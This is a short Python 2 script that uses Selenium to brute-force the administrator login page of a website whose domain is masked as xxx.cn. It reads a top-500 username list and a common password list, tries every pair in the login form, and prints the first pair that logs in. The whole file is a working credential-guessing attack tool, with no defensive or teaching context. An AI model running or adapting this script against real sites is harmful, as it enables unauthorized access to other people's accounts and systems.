#coding:utf-8



import time
import sys
from selenium import webdriver

reload(sys) 
sys.setdefaultencoding('utf-8')



def BruteLogin(user,pwd):
    
    
        browser.get('http://xxx.cn/manage/login.aspx')
        browser.implicitly_wait(7)
        elem = browser.find_element_by_name("name")
        elem.send_keys(user)
        elem=browser.find_element_by_name("pws")
        elem.send_keys(pwd)

        elem=browser.find_element_by_id("submit")
        #print browser.current_window_handle
        elem.click()
    
        time.sleep(1)
        if '当前用户' in browser.page_source:
        
            print 'Login Success:' + user + '|' + pwd
            sys.exit()
        else:
            print 'LoginFaild!'


browser = webdriver.Chrome()


def main():
        
    with open('usernameTop500.txt','r') as fuser:
            for user in fuser.readlines():
                    u = user.strip()
                    with open('topwdglobal.txt','r') as fpwd:
                        for pwd in fpwd.readlines():
                                p = pwd.strip()
                                print 'testing...' + u,p
                                BruteLogin(u,p)

    browser.quit()



if __name__ == '__main__':
    main()